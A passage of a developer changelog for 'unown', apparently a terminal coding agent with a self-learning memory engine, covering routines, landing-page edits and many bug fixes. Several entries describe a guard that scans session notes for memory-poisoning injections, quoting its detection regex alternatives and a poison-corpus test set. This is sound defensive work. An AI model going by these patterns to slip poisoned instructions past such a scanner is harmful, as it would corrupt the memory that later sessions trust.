DST policies are the Temporal "compatible" model, pinned by 45 engine tests: spring-forward gaps shift forward (02:30 fires 03:30 — a late run beats a vanished one), fall-back folds fire once at the earlier pass, Feb-29/4-year scan caps, half-hour zones, and fires are never returned in the past. Management surfaces, all driving the same REST core: the **TUI** (`unown dashboard routines` / `/routines` — list ordered by next occurrence with paused sunk (Things' Repeating-list ordering), a create wizard accepting every kind in one validated field, a field-picker edit flow, `s` skip / `S` snooze keys, a last-10-runs streak row with skips visible, full spec in the detail pane), the **CLI** (`unown routines` — `skip`, `snooze`, full-field `edit`, `--json` on list/history; `unown automations` stays as the alias), and the **session tools** (renamed `routine_*`, plus a new mutation-gated `routine_run` for "test it now"; the `UNOWN_AUTOMATION=1` no-recursion gate still hides every mutation tool inside routine runs). Engine fixes that shipped with it: run-now now respects the engine-wide 2-run concurrency cap (429 instead of silently exceeding it), delete removes ALL run rows (running ones included — no more orphans lingering until retention), SSE invalidations cover the run/recovery transitions that previously relied on the 4s poll, and manual runs never consume an interval routine's pending slot (cron recompute is idempotent, `every` slots are untouched). Legacy rows migrate in place (pragma-guarded ALTER TABLE; cron/delay rows infer their kind). Verified live end-to-end against a real engine + Agnes AI: every-1m runs fire on the 20s poll and re-arm; NY-timezone daily arms at 09:00 EDT from a UTC host; skip/snooze/edit/pause/resume all hit the engine; an `until`-bounded routine completes at its boundary (2 runs, then `completed`); a 14/14 PTY drive of the dashboard (real terminal, real engine) walks list → detail → skip → wizard → create. Core: `routine-schedule.ts` (pure, dependency-free — cron.ts's contract) + `automations.ts` v2; tests: `test/routine-schedule.test.ts` (45) + 21 new automations cases + 5 TUI interaction cases + 4 CLI cases.

### Changed (the landing page — the capability dex absorbs the feature captures, 2026-10-23)

- **the capability dex and the feature carousel are one band** — the page met a capability at position 3 and met its footage at position 5, so the two bands folded into the dex: one searchable numbered spine № 001–020, where № 001–010 stay the drawn creatures (specimen, game-voice entry, weakness, cry, receipts) and № 011–020 are the **behavior** entries — the filmed surfaces that belong to no single form (the fix loop, plan mode, checkpoints, review, the wiki, doctor, split view, goals, routines, skills). Each entry now carries its own capture in the same detail pane as its copy: 9 movies and 1 still, with № 003 Task holding two reels behind a reel picker. Attribution is one capability per capture, so `subagent-explore` + `fleet` land on Task and `overlays` (which opens `/hooks` and `/permissions`) lands on Hooks, while the wiki and the doctor CLI are their own entries instead of being filed under Parity. The eleven entries the harness has not filmed render the same aspect box with `no capture yet`, every row carries a `● filmed` / `○ pending` mark, and the lead's mix is derived from the data (`9 of 20 carry a capture — 9 movies, 1 still set, 11 pending`). No capture was made or invented for the merge. The band opens on the first entry that has footage rather than № 001, so a reader who does nothing sees a capture and a specimen, not an empty stage. Nav drops "Features"; anchor `#features` is gone and `#dex` is the single target. The `/split*` command table keeps its one canonical home in the band, which moved with it — `landing_claims.mjs`'s `PAGES` map now points at `dex.tsx`. The merge paid for itself before landing: one section head, one lead, one controls row and one provenance line went away, the carousel's writeups moved into the entries they describe instead of being restated, and the harness sentence that repeated inside every empty stage collapsed to one legend line — so the page went from 10 bands / 13.0vh / 3,014 words to **9 bands / 12.9vh / 3,016 words** while its catalog doubled, with the band itself at 1.92vh against the 3vh cap. Both axe passes, the contrast audit (1,323 text nodes, two schemes), the palette gate, the theme toggle and the changed-line coverage gate are green; the live-region count in the band is two, down from the twelve-plus the merged markup would have carried untouched.

### Fixed

- **the 2026-10-23 real-user hardening round — four defects whose combined effect zeroed every real learning turn, plus seven audit-pinned memory bugs** — a full benchtest of the memory system as a real user (terminal sessions in a fresh project → live engine → dreams watched end to end against a real upstream) found the learning loop dying at a different layer on each turn, all fixed with regression tests and the loop re-verified end to end (session → note → dream → platform → file → the next session answers "vitest / Fly.io / imperative mood" FROM memory, source cited). The four live finds: (1) **the propagation scanner flagged its own product's grammar** — the note-level regex carried BARE `future sessions|all sessions|prominent` alternatives, and the assistant's session-closing acknowledgment ("Noted for future sessions") quarantined the whole note, the dream's extracted rules then echoed it (layer-2.5), and the turn gated; verb-gated now (imperatives, consequence clauses, persistence-verb-near-target, instruction-shaped prominence), descriptive acknowledgments clean, all 10 poison-corpus attacks still tripping (verified against `benchmarks/memory-eval/poison-corpus/`, split-note v08's second half included). (2) **the runner-directive conjunction was line-global** — "test runner is vitest; deploy target is Fly.io; code style disallows semicolons" quarantined as a runner switch (runner in clause 1, switch-language about a DIFFERENT subject in clause 3); clause-aware now, same semicolon-delimited clause, the corpus's parenthetical/dash poison deliberately still inside one clause. (3) **a flaky canary reference gated every other dream** — `sampleCanaryTasks` picks the most recent passing baseline/candidate per task, and a hard MINTED task with a ~50% pass rate (measured live: `mint-fix-multiplier-label-buzz`) turned the canary into a coin flip gating on upstream variance; the canary's own verdict now meets the harness's verify-twice standard (FAILED → one confirmation re-run; two failures gate, fail+pass records a flaky reference and proceeds, fail+infra-error gates conservatively; drift/claim analysis exempt — it reads the run's transcript, not its luck), live-verified both ways ("failed twice under new memory v20 (verify-twice)"). (4) **a watchdog-killed dream left a phantom 'running' row** until the next engine boot — the watchdog heals its dream row inline now (the busy mutex guarantees ownership; undreamed notes retry losslessly). The audit-pinned set (each with unit tests): canary double-rollback (one rollback row, one `memory:changed`), partial-ship unwind (`shipEngineRules`/`appendRules`/`runProjectDream` revert platform events when the tier write fails after `platform.add` — no platform/file divergence, no infinite re-dream; a cap-refusal dream consumes its notes as 'gated'), bounded hard-won growth (`PI_MEM0_MAX_HARDWON`, default 60, seeds first + an absolute render ceiling at the writeTier cap with visible over-flow footers), retention un-shipping EVERY shipped iteration of a regressed task (empty-ids ships re-render from the platform instead of the version ping-pong), scoped watchdog row recovery (2s grace for same-breath rows, foreign rows survive), the Fisher-Yates regression sweep (the biased comparator sort never was uniform) routing FAILED sweeps through retention, the busy-409 contract for every engine API lane (`startFireAndForget` closes the check-then-acquire TOCTOU synchronously), and the env hot-reload no longer clobbering live variables (an empty `KEY=` line is unspecified, not a wipe — a shell-exported `UNOWN_HOME` survived the first scheduler tick pre-fix). Docs: `docs/memory-system-review.md` F11. Pinned across `test/canary.test.ts`, `test/guard.test.ts`, `test/harness-retention.test.ts`, `test/router.test.ts`, `test/engine-supervisor.test.ts`, `test/dream-canary-crash.test.ts`, `test/server-busy.test.ts`; full suite 3895 pass / 0 fail.
- **degenerate empty 200 completions are never success — a three-layer answer to an upstream that serves them** — measured live on the Agnes flash endpoint under concurrent load: 200 streams with ZERO content frames (a role delta, a bare `finish_reason: "stop"`, maybe a 0/0 usage chunk, after 48–81 s) and their non-stream twins (empty content, 0 completion tokens). Every layer used to treat that shape as a successful empty answer: pi-ai minted a VALID empty assistant turn, print mode wrote an empty stdout and exited 0 — poison for unattended callers. Three layers now: (1) **pi-ai** (`openai-completions.ts`) throws a retryable "empty completion" error when a `stop`-reasoned stream carries zero content blocks (`retry.ts` pattern; `length`/`toolUse`/aborts are deterministic outcomes and stay unflagged; thinking-only and tool-only responses pass); (2) **the bridge** (`mini-services/llm-bridge`) holds stream frames back until the first real work product (text, tool call, or reasoning — `pure.ts sseFrameSignalsContent`) and retries the upstream ONCE on a degenerate stream, transparent to the client, before forwarding for the client-side guard to answer; the non-stream lane retries once then answers an honest 502 (mem0's SDK, probes and engine wrappers all classify failures correctly); `/health` gains a `degenerate` counter; (3) **print mode** never exits 0 on an empty answer — a stderr line + exit 1 in both the text and `--output-format json` lanes. E2E-verified against a mock upstream with switchable failure modes: good = answer/exit 0; empty-once = bridge heals transparently (counter 1, answer, exit 0); persistent empty = stderr + exit 1 in 14 s (was: silent empty, exit 0); non-stream twice-empty = 502 after one retry. Pinned by `pi-repo/packages/ai/test/openai-completions-empty-completion.test.ts` (6) and 17 new `pure.test.ts` cases (161 total).
- **print mode hangs on an open silent stdin — the unref'd idle timer, the F10 lesson's mirror** — the piped-stdin reader's idle/settle timers were `unref`'d, and a Bun event loop parked on an open-but-silent pipe's poll (a supervisor's control pipe, an editor harness) never wakes from an unref'd timer: `unown -p` with an open stdin hung >110 s with the 500 ms idle window armed and never firing. REF'd now (safe: `settle()` clears the timer and the byte cap + idle window bound the read), measured after: the same shape exits in 1 s. The engine's mem0-platform seed budget is env-tunable (`PI_ENGINE_SEED_BUDGET_MS`, floor 3 s) with a late-settlement recovery line — a healthy-but-slow seed LLM round (measured 57 s behind the bridge) no longer boots a good engine "degraded" with a warning that can never be unsaid.
- **every model was seeded at 128K/8K — the known-model spec catalog stamps published limits instead** — every path that seeded a `models.json` record from a model id ALONE stamped the same conservative defaults on every id: `contextWindow` 131072, `maxTokens` 8192. For a model with officially larger limits that is a silent capability cut on both axes (measured 2026-10-23: `agnes-3.0-flash` — the default upstream — is documented at 524,288 context / 65,536 output, so pi compacted at 128K while the endpoint still had 384K of headroom, and capped answers at 8K of the 65K the upstream serves); for a model with smaller real limits the old defaults over-promise — compaction fires too late and output gets upstream-truncated. New `model-specs.ts`: `KNOWN_MODEL_SPECS` stamps only OFFICIALLY PUBLISHED specs (`agnes-3.0-flash`/`agnes-2.5-flash` — Agnes docs, 512K/65K; `kimi-k2.5` — Alibaba Model Studio, 256K/16K; `qwen3.7-plus`/`qwen3.6-plus` — 1M context (decimal mega, not 1,048,576), 131K/65K output), and unknown ids keep the conservative floor — guessing is worse than under-promising. Exact ids only: no prefix matching, no case folding (a matching prefix is a coincidence, not a spec). All four seeding sites stamp through `modelSpec(id)`: the registry upsert (`newModelRecord`), the live catalog refresh (`refreshProviderModels`), the engine's sandbox agent dir (`runner.ts ensureAgentDir`) and the first-run bridge seeding (`term.ts writeModelsJson`) — and an entry's own values still win (a user-tuned `contextWindow` survives, the M1 accumulate contract). Pinned by `test/model-specs.test.ts` (4 tests: lookup, fallback, prefix non-matching, catalog integrity — maxTokens fits inside contextWindow, nothing below the old floor) plus the updated seeding assertions in `test/models-catalog.test.ts` (a known id stamps 524288/65536 while a mystery id keeps 131072/8192 in the same fresh seed) and `test/providers.test.ts` (upsert: a known new model gets the published spec, an unknown id keeps the defaults, the user-tuned record is untouched). Full suite: self-learning 3899 pass / 0 fail (156 files).
- **`unown doctor` misdiagnosed an engine auth miss as broken stats + wrong restart advice** — found live in the 2026-10-23 real-user pass: a binary install (the default `curl | sh` lane) talking to a source-repo engine printed `✗ self-learning engine — ? runs, ? dreams` followed by `✓ engine version — engine predates version reporting — restart to update: unown engine restart` — both wrong. The engine was up and answering; it answered **401**, because the CLI auto-discovers the per-boot bearer token in ITS OWN data dir (`~/.unown/data/self-learning/engine.token` for a binary install) while the source-repo engine's token lives in the repo's `data/self-learning/` — the M7 auto-discovery contract holds within one install type and silently breaks across them, and restarting cannot fix auth. The doctor read the 401's error body (`{"error": ...}`, no `kpis`, no `version`) as if it were a real overview: the missing `kpis` printed as `? runs, ? dreams` and the missing version block fell into the pre-M8 "predates version reporting" verdict — actively misleading advice next to a red ✗. Three lanes now: **401** prints `⚠ up but rejected this CLI's token — learning paused, chat unaffected; point UNOWN_ENGINE_TOKEN at the ENGINE's data/self-learning/engine.token (binary and source installs keep different data dirs)` (warn-class like the unreachable branch — chat works, doctor still exits ready); **other non-OK** prints `engine answered HTTP <status> — learning paused, chat unaffected` instead of empty stats; the router/version sub-checks (5b/5c) are skipped entirely unless the response was OK, because nothing can be learned from an error payload. Verified live both ways: the mismatched-token scenario (source CLI + `PI_SELFLEARNING_DATA` redirected at a tokenless dir against the running engine) now prints the actionable warn line with no version check, and the normal single-install path still prints `✓ self-learning engine — 20 runs, 4 dreams`. Pinned by `test/doctor-engine-auth.test.ts` (2 spawn-level tests: a one-route engine stand-in answering 401/500 — asserts the auth message names `UNOWN_ENGINE_TOKEN`, never prints `? runs`, exits 0, and that NO `engine-version` check exists off an error body). Full suite: self-learning 3890 pass / 0 fail (155 files) + integration 13/13.
- **landing: the changelog rail's ◀ ▶ nudge buttons were dead — `scrollBy` targeted the track, not the scroll container** — the release rail is a native scroll container, but the overflow lives on the `.gb-rail` region `div` (`overflow-x: auto` in `landing.css`), not on the `<ol class="gb-rail-track">` inside it (a `width: max-content` flex row cannot scroll). The nudge handler held the ref on the `<ol>` and called `el.scrollBy(...)` — a non-scrollable element scrolls by exactly zero, so both buttons shipped inert while the band's own caption advertised them ("Scroll it sideways, or use ◀ ▶") and while a unit test passed, because the test mocked `scrollBy` on the same wrong element the code targeted — a mock at the wrong layer cannot catch a wrong-layer bug; the real-browser probe that would have caught it (`download/rail_shots.mjs`, "the ◀ ▶ buttons move it") is a check, not a committed gate. The ref now sits on the region div, the step is still measured off a `.gb-rail-stop` tile (one tile plus its 16px gap, so a tile-width change never desynchronises the nudge from the CSS), and the test pins the corrected contract: the mock goes on the region, and the region's `aria-label` is asserted so the scroll target can never silently regress to the track. Verified as a real user on the production build: "older stops" scrolls `scrollLeft` 0 → 328, "newer stops" returns it to 0.
- **landing: the FAQ's closed questions showed no expandability affordance — the ▶ cursor was `opacity-0` until open** — the band's `PixelCursor` marked only the OPEN item (`opacity-0` + `group-data-[state=open]:opacity-100`), so the seven closed questions rendered as seven identical bordered boxes with nothing clickable about them; `aria-expanded` covers screen readers, not eyes, and a first-time sighted visitor had no reason to believe the list was an accordion at all (confirmed by a VLM review pass over a zoomed crop: "the closed items lack standard interactive cues… difficult to intuitively recognize"). Every trigger now shows its cursor while closed — `text-faint` at rest, `text-dim` on hover, solid gold when open — the same ▶ the nav, the rail and the games use, brightening along the state axis instead of appearing from nothing; the open item still reads as the active row and the closed rows now read as rows you can act on. Pinned by a regression test (every trigger carries its cursor and the class string must not contain `opacity-0` — happy-dom cannot compute rendered opacity, so the class-level pin is the guard), and the accordion's `accordion-down` height animation was re-verified on the production build after the edit.
- **landing: dex accessible names stuttered on entries named with an article — "Play the The fix loop capture"** — `Pause the ${entry.name} capture` and `play the ${entry.name} cry` compose a label that already carries its own "the", and two entries are named with one (№ 011 "The fix loop", № 015 "The wiki"), so screen readers announced the doubled article on every focus. The labels now compose through `bareName()` (a leading-article strip — "Play the fix loop capture"), while the visible terminal title keeps the full name ("unown — The fix loop" reads fine there). Pinned by a band-wide no-stutter sweep over every `aria-label` plus both pause/play states of № 011 read from the shown pane.
- **docs: three dead `memory` links in usage.md (a botched edit ate the `[m`) + the README's routines row was two kinds behind** — usage.md's related-pages line, the session-injection pointer and the deep link all read `emory](memory.md)` (byte-verified with the AGENTS.md gate `grep -rnP '(^|[^A-Za-z])emory\]\(' docs/*.md`, now clean); the README's routines documentation row still said "the four schedule kinds" (events made five) and its feature paragraph was silent on event routines, the M5 monitoring/delivery policies and M6 retries/chains — both rewritten, and the documentation table gains the four rows it was missing (standing orders, ralph, repomap, watch). `docs/routines.md` gains the M6 section (retry policy, chained routines, surfaces) and the README/CHANGELOG/REST/TUI/tools references were updated to match the shipped semantics.
- **`unown uninstall` now finishes on Windows — the running `.exe` is the install, so the root is deleted after the process exits** — reported from a real Windows install (0.0.3): the command removed both shims, then `rmSync` hit `EPERM` on the versioned root because `<root>\versions\0.0.3\unown.exe` was the running image — so it exited 1 having deleted the only way to re-run itself ("close any running unown processes, then re-run `unown uninstall`"), left the root half-deleted (rollback files gone, `unown.exe` + `VERSION` stranded) and kept `install.json` claiming an install that no longer worked. Reproduced on Windows 10.0.29683 and fixed in four parts: (1) **the root goes first** — a failed removal leaves the shims and the install record untouched, so the printed remedy is real; (2) **Windows self-delete** — when the exec path is inside the root, removal is scheduled through a detached `cmd` helper (random name in `%TEMP%` created exclusively, relative script name + cwd so no path ever reaches cmd's command line, `rmdir /s /q` retried ~30×1s until the image lock clears, self-deleting on both terminal paths), with the shims and `install.json` removed immediately — measured live: a standalone binary compiled into a scratch root and run as `uninstall` left the root gone **101 ms** after exit, exit 0; (3) a shell whose cwd is inside the root is refused before anything is touched (Windows cannot delete a folder a shell sits in); (4) the log no longer prints "removed" before attempting the removal. POSIX keeps the synchronous delete. New `uninstall-self-delete.test.ts` compiles a real binary into a scratch root and requires that root to vanish — the gate the injected-remover unit tests structurally could not provide; it runs on Windows, macOS and Linux. The same class was closed everywhere else it could land: the checkout lane's `--purge-checkout` now deletes the checkout **before** the shims (a failed purge used to leave no command to re-run) and refuses when the shell's cwd is inside the tree, and every remaining removal in both modes (`--purge-data`, shims, `install.json`, the checkout) is attempted and reported per path instead of throwing — a session holding `~/.unown` open on Windows used to surface as an uncaught EPERM stack trace, and POSIX purges could stop halfway. POSIX needs no deferral: unlinking a running image is legal there (measured on Linux 6.x — a mapped image's root directory was removed while the process ran), so its path stays synchronous and the test pins that it is already complete when the command returns. One platform-identity defect surfaced by that cross-OS gate and fixed with it: shim ownership was decided by path SPELLING, so a root reached through a symlink was called foreign — macOS resolves `/var` to `/private/var` (exactly where `TMPDIR` lives), and Windows 8.3 names (`RUNNER~1`) and junctions spell one directory two ways — which left an orphan shim on PATH after the install was gone. Ownership and containment now compare filesystem identity (`canonicalPath` via `realpath`, with a parent+basename fallback for a shim whose target no longer exists) — on the running platform only, so a layout computed for another OS stays a string comparison.
- **the guard was quarantining every substantive terminal note — the note's own metadata label tripped the injection scanner** — found by the 2026-10-22 real-user benchtest (a genuine bugfix session in a scratch project produced "1 quarantined, 0 extracted, 0 learned"): the note's harness-authored metadata line ("Session metadata (never extractable — counts, duration and session id only): …") contains "never", which DIRECTIVE_RE matches inside the runner-directive conjunction — every note carrying the M1 outcome-first format was classified as an injection payload and quarantined, silently zeroing the learning loop. Two fixes: (1) **guard layer 0** (`guard.ts scanUntrustedText`): harness-authored scaffolding lines (the header, the metadata label, the shield-telemetry line) are stripped before the LANGUAGE rules run — they are written by the harness itself, the same trusted-by-construction status the M10 telemetry line documents; the model-authored Final-outcome text and every structural rule (zero-width, base64) still scan in full, and poison smuggled inside an outcome line still trips. (2) **the label no longer carries guard-trip words**: "Session metadata (counts, duration and session id only — data, not knowledge)" (termhooks.ts + the landing literal + the memzero reframe regex, now phrasing-agnostic). Verified live end-to-end after the fix: the same note dreams into 2 real memories ("the canonical test runner is ./scripts/check.sh; a bare bun test is not the required verification path" + the implementation convention), the project.md render carries them, and a fresh session's FIRST and only test command is `./scripts/check.sh` — the remembered rule applied with zero rediscovery cost (session 2: 39 s, exit 0).
- **a non-JSON reconcile response killed the whole dream** — the quality-axes live campaign caught "llm: no JSON object found in response" (a 253 s ramble) failing the entire dream step; the reconcile pass is maintenance, not a correctness gate, so it now retries once and then fails OPEN (additive-only round; the next dream reconciles the backlog — `memzero.ts reconcileMemories`, bus event `mem0:reconcile-failed`). Same class: **a verdict targeting one memory twice** (DELETE then UPDATE) threw "Memory with ID … not found" — op application is now idempotent (a not-found op is a satisfied op). Pinned by `test/memzero-unit.test.ts` (fail-open both-attempts, retry-then-apply, empty-scope no-spend, duplicate-op idempotency).
- **the reconcile prompt now retires superseded knowledge instead of archiving it** — benchtest-driven prompt hardening (each rule pinned by a measured failure): stale rules stated as SIDE CLAUSES of newer sentences ("…; X still enforced…") make their host memory stale too (UPDATE to drop the clause); advocacy for a superseded rule ("X caught bugs early; valuable to retain") is advocacy for the LOSER and is deleted — but never the winner's own supporting evidence; ENTITY STALENESS after a version/tool migration: every memory describing the OLD generation's schemas or behavior is stale even when it never asserts a version ("the zod 3 schema mirrors the invoice schema"). Measured effect on the quality-axes campaign (agnes-3.0-flash, production Mem0 path): staleness FAIL -> PASS, contradiction accumulated FAIL -> PASS; the final fresh campaign is **4/4 axes PASS** (contradiction, staleness, forgetting, interference — receipts in `benchmarks/memory-eval/quality-axes/results/`, the first post-swap live campaign; the runners themselves were re-based in the previous milestone).
- **`unown doctor`/`setup` probe with the real key — auth.json finally feeds the endpoint check** — found live during the M2 E2E: doctor reported `credentials rejected (HTTP 401)` on a healthy Agnes install while real chat runs succeeded seconds apart. The probe path read only `models.json`'s `apiKey` field, but `unown setup` stores real keys in `auth.json` (mode 0600, the AuthStorage contract) — so the probe went out with NO Authorization header and classified the inevitable 401 as a credentials failure, telling the user to fix a key that worked. Both probe sites (`cli.ts` doctor, `setup.ts` provider summary) now go through `resolveProviderKey` — the single key source (auth.json > models.json literal > `$ENV` ref) that the chat path itself uses — so the health check authenticates exactly like a real request. Pinned by `test/doctor-probe.test.ts` (4 tests: the active provider carries no models.json key, the resolved key is the auth.json one, the composition authenticates against a live local endpoint, and the OLD header-less path demonstrably 401s — the regression, on record). Verified live: doctor now prints `✓ model endpoint reachable — https://apihub.agnes-ai.com/v1 · serves agnes-3.0-flash, …` and "unown is ready to chat".

- **print mode never hangs after the answer — the exit nets actually fire now** — the 2026-10-22 real-user benchtest caught a finished session (answer written, note delivered) surviving 6+ minutes at 0% CPU: Bun's fetch keep-alive sockets (note POST, bridge traffic) parked the event loop in an infinite epoll wait, and BOTH safety nets were `unref`'d — an unref'd timer can never wake a parked loop, so the 15s hard-exit grace armed at the final `agent_end` never fired, and the unref'd 1s subscription poll meant the arming subscription itself might never attach. All three timers in `installPrintStallWatchdog` (`self-learning/src/cli.ts`) are now REF'd — safe because `cmdPrint` terminates through `process.exit(code)` on every path; a ref'd timer cannot outlive a one-shot process that always hard-exits, it can only guarantee the nets fire. The same milestone closes the other two forever-awaits: **the session_shutdown handler chain got a deadline** (`coding-agent/src/core/extensions/runner.ts`, 15s, `PI_SHUTDOWN_DEADLINE_MS` tunable, fail-open with an error-channel report — upstream pi #9997 fixed exactly this; the vendored tree now carries the equivalent), and **the raw-stdout backpressure retry loop got a ceiling** (`coding-agent/src/core/output-guard.ts`, 30s of continuous ENOBUFS/EAGAIN drops the chunk with a stderr note instead of retrying every 10 ms forever into a full or orphaned pipe). Print mode also handles **SIGINT** now (`coding-agent/src/modes/print-mode.ts`): Ctrl-C gets the same graceful dispose as SIGTERM with the conventional exit 130. Pinned by `coding-agent/test/extensions-runner-shutdown-deadline.test.ts` (4 tests: settle, no-handlers, never-resolving abandoned at the deadline, slow-then-settle ordering) and verified live: a tool-using session during an active engine dream completes, answers, and exits 0 (previously: indefinite hang).
- **interactive sessions no longer starve behind engine dreams — bridge admission lanes + concurrency cap + interactive-yield** — measured starvation: the old bridge FIFO only spaced request STARTS (400 ms) while every stream ran concurrently, and the upstream degrades hard under concurrent streams from one key (2 s calls measured at 45 s, and 118 s with three admitted streams) — so an AutoDream cycle made a human's terminal session look hung for minutes. Three layers landed in `mini-services/llm-bridge`: (1) a **concurrency cap** (`BRIDGE_MAX_CONCURRENCY`, default 3, floor 1) on in-flight remote/fallback attempts, held headers-to-body-end (the wrapped `trackResponse` releases the slot exactly when the body is consumed — the degradation is driven by active streams); (2) **two admission lanes** (`pure.ts laneForRequest`, pinned by 7 tests): interactive requests (no lane marker — terminal/print sessions) are admitted ahead of queued background work, which signals via bearer `bridge-background` (the engine's learning clients — mem0's internal OpenAI client cannot forward custom headers, so the apiKey doubles as the lane signal) or the `x-unown-lane` header; background is additionally capped at `cap - 1` slots; (3) an **interactive-yield window** (`BRIDGE_BACKGROUND_YIELD_MS`, default 45 s): after any interactive arrival, NEW background admissions pause — the dream waits while a human works; already-admitted background streams finish uncanceled, and the window re-arms on each interactive arrival. The engine side signals correctly from all three surfaces (`llm.ts` learning calls, `memzero.ts` platform config, `runner.ts` engine agent sessions — canary/harness/automations). `/health` exposes the full `lanes` block (cap, slot limit, yield state, queued, admitted). Measured after: an interactive session during an active dream is admitted and completes with exit 0 (worst case bounded by upstream per-call latency; pre-fix: minutes of starvation). Docs: `mini-services/llm-bridge/AGENTS.md`, `.env.example`.

- **the learning loop's silent empty-extraction drop — terminal notes now actually become memories** — the 2026-10-22 real-user benchtest (fresh install, live bridge, a genuine bugfix session in a scratch project) caught the Mem0-swapped dream losing learnings: the same substantive note extracted 0 or 1 memories run-to-run (measured with a MITM capture of the exact extraction call: the model answered `{"memory": []}` — 6 completion tokens — for the identical 8.7k-token prompt that extracted 1 memory minutes earlier). Root cause: the terminal note LED with session metadata ("Terminal session in X (1 min): 1 prompt(s), 5 tool call(s)…"), and the learning core's own custom instructions told the extractor to never extract "session metadata (durations, tool-call counts)" — the metadata-led opening tipped the model into classifying the WHOLE note as non-extractable. Four fixes landed together: (1) **the note template is outcome-first** (`buildTerminalNote`, `termhooks.ts`): the header is `Terminal session outcome in <cwd>:`, the final outcome follows immediately, and counts/duration moved to a trailing explicitly-labeled `Session metadata (never extractable — counts and duration only):` line (the old in-note consolidation instruction is gone — the platform prompt carries that guidance now); (2) **the custom instructions carve out the note shape** (`MEM0_CUSTOM_INSTRUCTIONS`, `memzero.ts`): pitfalls, fixes, verification outcomes and conventions in a session note ARE extractable knowledge — only the counts/duration line never is; (3) **the empty-extraction escalation** (`Mem0Platform.add`): when an infer pass extracts nothing from a note that HAS substance, ONE deterministic retry fires with the metadata scaffolding stripped and the outcome reframed pitfall-first (`reframeNoteForExtraction` — pure text, no LLM; a metadata-only note returns null and never pays for the retry); (4) **the add-result mapping drops empty-text rows** (a live store row with empty text was observed). Measured after the fix, same upstream (agnes-3.0-flash): the new-format note extracts directly; the OLD-format note — which the pre-fix path dropped ~half the time — is rescued by the escalation (2 memories: the pitfall and the verify workflow); a metadata-only note stays at 0 with no retry. The end-to-end loop re-verified live: session → note → engine dream → `.unown/memory/project.md` renders the learned pitfall with the provenance sidecar, and the next session injects it. Pinned by `test/memzero-unit.test.ts` (11 tests: reframe stripping for old+new formats, [subagent] tags, the metadata-only null, the 80-char substantive floor, the payload.metadata nesting regression, empty-text drops) and the re-pinned note-shape suites (`test/notes.test.ts`, `test/termhooks.test.ts`, `test/cli/golden.test.ts`).

- **memory metadata nesting — kind routing works on the real platform again** — `normalizeMemories` set `metadata = payload` (the whole vector-store row), but real-platform rows nest the metadata ONE level down (`payload.metadata`), so every `m.metadata.kind` read as undefined: the render's kind routing (seed → Workflow, harness → Verified fixes) and the render cap's hard-won-rule immunity (kind harness/seed) silently never fired — confirmed empirically by the re-based quality-axes harness against the live platform. Now `metadata = payload.metadata ?? payload ?? {}` (the fallback keeps the fake test seam and pre-nesting rows readable) and the empty-text filter is trim-based. Pinned by `test/memzero-unit.test.ts` (payload-shape tests, both nestings).

- **a fresh clone now installs on the bun the docs demand — and the docs demand the right bun** — `bun run agent:install` verified bun ≥ 1.2, but `pi-repo/bun.lock` is a `lockfileVersion: 3` text lockfile that bun only reads from 1.4 onward: a 1.3.14 machine (satisfying the documented floor) died at step 2 with `Unknown lockfile version` and a frozen-lockfile failure on the rewrite it attempted anyway (verified live 2026-10-22). The floor is now ≥ 1.4 everywhere it was ≥ 1.2 (`scripts/lib.ts` `bunAtLeast140`, the installer's two die messages with the reason, `docs/install.md`, `docs/quickstart.md`, README requirements). While fixing it, the version-check function's destructuring — which had shipped corrupted from its first commit and kept working only through bun's transpiler error-recovery — was rewritten clean.

- **the instruction-set audit is warning-free again** — `AGENTS.md` referenced `src/verify.ts`, which lives at `pi-repo/packages/self-learning/src/verify.ts` (the root `src/` is the landing page); `unown doctor`'s audit flagged it on every run. Path corrected; `unown doctor-instructions` reports 0 warnings.

### Added

- **the three learning-visibility indicators — memory bar, dream toast, print-answer ping** — the 2026-10-22 benchtest miles made the learning loop *work*, but its work stayed invisible in exactly the three moments a user actually looks: (1) **the memory bar** — a healthy session's footer line gains `memory: up · mem ▕█░░▏ v17 · 4 rules · dreamed 12m ago`, one segment summarizing what the engine learned in THIS project, read from the project's own files (`.unown/memory/project.md` for the `- ` rule count under `##` sections, the provenance sidecar for version + dream age) at the existing probe cadence — never per keystroke — with the 4-cell meter borrowing the pi context meter's own `▕█░▏` chrome (fill `min(rules, 16)/16`, bounded; the honest count rides next to it in digits) and dream age on the activity suffix's whole-minute ladder so the never-churn contract holds. Precedence is the BOTTOM of the footer ladder: the bar rides only the clean `memory: up` line — warning lines (down/paused/starting) and standing-condition suffixes (old build/stale) stay undiluted; no memory file, no sidecar (v0, no dreamed segment) or any read error degrades to byte-identical pre-bar text. (2) **the dream-news toast** — `/api/overview` gains a `dreamNews` block (`{id, project, added, version, at}` — the newest project dream that ADDED memories within the last hour, key omitted when there is no news so pre-M3 consumers never meet it), and the terminal probe fires `✦ AutoDream learned 3 new rules for this project (v17 → v18)` once per new dream per session (an in-memory last-seen latch — a second session re-announces still-fresh learning once, as its welcome-back line). Unlike the state toasts it fires at session start too, on purpose: learning that happened while you were away is an event, not a standing condition. Another project's dreams, `added: 0` no-change dreams and >1h-stale news never interrupt (the terminal re-checks every filter — the probe response is advisory input, never authority). Project dreams now record `entries_added` in every store path (the column existed unused since the first schema), and engine-scope dreams sharing the table never shadow the scan (their note grammar differs; the bounded top-8 walk is pinned with its trade). (3) **the OSC-9 answer ping** — a `unown -p` run that finishes after `UNOWN_NOTIFY_MS` (default 120 s) emits `\x1b]9;unown: <first 80 chars of the answer>\x07` plus one bare BEL when the answer lands: supporting terminals (iTerm2/WezTerm/Ghostty…) post a desktop notification, everything else rings once — the BEL is the fallback half of the contract, because OSC-unaware emulators swallow unknown sequences whole. TTY-only (piped/redirected/CI stdout never sees control bytes), real-answer-only (error/aborted endings and empty answers ping nothing — print mode prints nothing for them), text-lane-only (`--mode json`/`--output-format json` own stdout byte-for-byte), and never the TUI (the user is present, and a raw escape mid-frame could tear the render — see `self-learning/src/notify.ts`); the emission site sits after `runPrintMode` resolves, on a flushed stream. Kill switches: `UNOWN_NOTIFY=0`, `DO_NOT_TRACK=1` (a ping is nonessential in exactly that sense). Pinned by 93 new tests: `test/engine-status.test.ts` +40 (bar copy/fill-mapping/precedence, disk reads, dream-news decision matrix + session latch through the real loop), the new `test/dream-news.test.ts` (8 — store scan grammar/shadowing/1h window/bounded walk/fail-soft + the `/api/overview` key-presence lane through the real `handleApi`), `test/engine-supervisor.test.ts` +15 (`parseDreamNews` wire narrowing), and the new `test/notify.test.ts` (30 — escape bytes, truncation, TTY/opt-out gate matrix, threshold, arrival decision, recorder-stream emission). Docs: usage (the ping), resilience (footer + toast tables), configuration + `.env.example` (both knobs), detached-engine-architecture (the API 